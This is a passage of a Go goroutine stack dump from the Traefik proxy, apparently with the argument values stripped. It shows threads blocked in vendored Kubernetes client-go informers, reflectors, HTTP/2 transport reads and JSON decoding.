github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:103 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 + goroutine 81 [chan receive]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).run( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:545 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:387 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 82 [select]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).pop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:519 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.pop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:388 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 83 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).run( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:545 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:387 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 84 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).pop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:519 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.pop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:388 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 70 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).watchhandler( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:373 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:339 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:204 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:203 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:122 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 31 [select]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).watchhandler( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:373 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:339 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:204 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:203 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:122 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 55 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).watchhandler( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:373 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:339 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:204 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:203 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:122 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 79 [runnable]:
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*structfielddecoder).decode( , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_reflect_struct_decoder.go:960 +
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*generalstructdecoder).decode( , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_reflect_struct_decoder.go:478 +
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*structfielddecoder).decode( , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_reflect_struct_decoder.go:962 +
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*fourfieldsstructdecoder).decode( , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_reflect_struct_decoder.go:624 +
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*iterator).readval( , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_reflect.go:85 +
github.com/containous/traefik/vendor/github.com/json-iterator/go.(*frozenconfig).unmarshal( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/json-iterator/go/feature_config.go:268 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/json.(*serializer).decode( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/json/json.go:191 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/versioning.directdecoder.decode( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/versioning/versioning.go:252 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime.decode( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/codec.go:54 +
github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch.(*decoder).decode( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch/decoder.go:62 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.(*streamwatcher).receive( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:93 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.newstreamwatcher /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:60 + goroutine 61 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).run( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:545 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:387 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 88 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch.func1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:278 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:272 + goroutine 77 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*pipe).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/pipe.go:64 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.transportresponsebody.read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:1739 +
encoding/json.(*decoder).refill( , , ) /usr/local/go/src/encoding/json/stream.go:159 +
encoding/json.(*decoder).readvalue( , , , ) /usr/local/go/src/encoding/json/stream.go:134 +
encoding/json.(*decoder).decode( , , , , ) /usr/local/go/src/encoding/json/stream.go:63 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer.(*jsonframereader).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer/framer.go:150 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming.(*decoder).decode( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming/streaming.go:77 +
github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch.(*decoder).decode( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch/decoder.go:49 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.(*streamwatcher).receive( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:93 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.newstreamwatcher /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:60 + goroutine 99 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch.func1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:278 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:272 + goroutine 89 [runnable]:
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1.1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:354 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1 /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:337 + goroutine 86 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
bufio.(*reader).read( , , , , , , ) /usr/local/go/src/bufio/bufio.go:216 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:309 +
io.readfull( , , , , , , , ) /usr/local/go/src/io/io.go:327 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.readframeheader( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/frame.go:237 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*framer).readframe( , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/frame.go:492 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*clientconnreadloop).run( , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:1477 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*clientconn).readloop( ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:1405 +
created by github.com/containous/traefik/vendor/golang.org/x/net/http2.(*transport).newclientconn /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:592 + goroutine 115 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).throttleproviderconfigreload( , , , , ) /go/src/github.com/containous/traefik/server/server.go:426 +
github.com/containous/traefik/server.(*server).preloadconfiguration.func1( ) /go/src/github.com/containous/traefik/server/server.go:398 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 90 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch.func1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:278 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:272 + goroutine 93 [select]:
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1.1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:354 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1 /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:337 + goroutine 92 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*pipe).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/pipe.go:64 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.transportresponsebody.read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:1739 +
encoding/json.(*decoder).refill( , , ) /usr/local/go/src/encoding/json/stream.go:159 +
encoding/json.(*decoder).readvalue( , , , ) /usr/local/go/src/encoding/json/stream.go:134 +
encoding/json.(*decoder).decode( , , , , ) /usr/local/go/src/encoding/json/stream.go:63 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer.(*jsonframereader).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer/framer.go:150 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming.(*decoder).decode( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming/streaming.go:77 +
github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch.(*decoder).decode( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch/decoder.go:49 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.(*streamwatcher).receive( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:93 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.newstreamwatcher /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:60 + goroutine 80 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*deltafifo).pop( , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:438 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).processloop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:150 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.processloop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedindexinformer).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:226 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/informers.(*sharedinformerfactory).start /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86 + goroutine 95 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:427 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:219 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 96 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:103 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 + goroutine 62 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).pop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:519 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.pop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:388 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 113 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).watchhandler( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:373 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:339 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:204 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:203 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).run-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:122 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 116 [select, 1 minutes]:
github.com/containous/traefik/vendor/github.com/eapache/channels.(*ringchannel).ringbuffer( ) /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:87 +
created by github.com/containous/traefik/vendor/github.com/eapache/channels.newringchannel /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:32 + goroutine 63 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch.func1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:278 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*reflector).listandwatch /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:272 + goroutine 101 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.(*pipe).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/pipe.go:64 +
github.com/containous/traefik/vendor/golang.org/x/net/http2.transportresponsebody.read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/golang.org/x/net/http2/transport.go:1739 +
encoding/json.(*decoder).refill( , , ) /usr/local/go/src/encoding/json/stream.go:159 +
encoding/json.(*decoder).readvalue( , , , ) /usr/local/go/src/encoding/json/stream.go:134 +
encoding/json.(*decoder).decode( , , , , ) /usr/local/go/src/encoding/json/stream.go:63 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer.(*jsonframereader).read( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/framer/framer.go:150 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming.(*decoder).decode( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/runtime/serializer/streaming/streaming.go:77 +
